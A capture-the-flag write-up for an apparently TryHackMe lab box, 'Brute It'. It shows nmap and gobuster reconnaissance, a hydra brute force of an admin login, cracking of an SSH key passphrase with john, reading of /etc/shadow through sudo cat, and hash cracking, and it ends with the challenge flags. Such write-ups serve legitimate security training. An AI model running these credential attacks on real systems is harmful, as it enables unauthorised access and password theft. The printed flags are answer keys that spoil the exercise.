# Brute It

Laurent Chauvin | November 04, 2022

## Resources

## Progress

### Task 1 : About this box

Nothing to do

### Task 2 : Reconnaissance

```
export IP=10.10.196.17
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 21:02 EDT
Nmap scan report for 10.10.196.17
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds                                                       
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.17
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/04 21:02:33 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.196.17/admin/]
/server-status        (Status: 403) [Size: 277]
Progress: 220533 / 220561 (99.99%)===============================================================
2022/11/04 21:45:52 Finished
===============================================================
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.196.17
+ Target Hostname:    10.10.196.17
+ Target Port:        80
+ Start Time:         2022-11-04 21:02:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5acf31f1b626d, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-11-04 21:20:46 (GMT-4) (1078 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Task 3 : Getting a shell

No 'robots.txt'.

In the source page of 'http://$IP/admin' we can see

```
<!-- Hey john, if you do not remember, the username is admin -->
```

Let's try admin:admin. Doesn't work. Neither other usual passwords.

Running hydra then
```
hydra -l admin -P /opt/rockyou.txt $IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-04 21:27:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.196.17:80/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.10.196.17   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-04 21:27:41
```

When login we find this flag and a ssh private key
```
THM{brut3_f0rce_is_e4sy}
```

Let's get the ssh private key
```
wget http://10.10.196.17/admin/panel/id_rsa
```

Convert it for john
```
ssh2john john_id_rsa > john_id_rsa_forJohn.txt
```

and run john
```
john john_id_rsa_forJohn.txt --wordlist=/opt/rockyou.txt                     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (john_id_rsa)     
1g 0:00:00:00 DONE (2022-11-04 21:31) 4.347g/s 315686p/s 315686c/s 315686C/s rubendario..rock07
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's set permission for ssh key and login
```
chmod 600 john_id_rsa 
ssh -i john_id_rsa john@$IP

Enter passphrase for key 'john_id_rsa': rockinroll
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  5 01:33:55 UTC 2022

  System load:  0.08               Processes:           110
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 45%                IP address for eth0: 10.10.196.17
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
```

Let's get flag
```
john@bruteit:~$ ls
user.txt

john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```

Time to privesc.


### Task 4 : Privilege Escalation

```
sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

Let's try to get root flag
```
sudo /bin/cat /root/root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```

Let's get root password
```
john@bruteit:~$ sudo /bin/cat /etc/shadow

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

Let's crack hashes with crack station. Doesn't work, hashes seems salted.

From hashcat documentation
```
1800	sha512crypt $6$, SHA512 (Unix) 2	$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/
```

Running into some troubles with hashcat
```
* Device #1: Not enough allocatable device memory for this attack.
```

Let's use john instead
```
john passwd --wordlist=/opt/rockyou.txt      

Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)     

```

## Flag

1. User

```
THM{a_password_is_not_a_barrier}
```

2. Web

```
THM{brut3_f0rce_is_e4sy}
```

3. Privesc

```
THM{pr1v1l3g3_3sc4l4t10n}
```
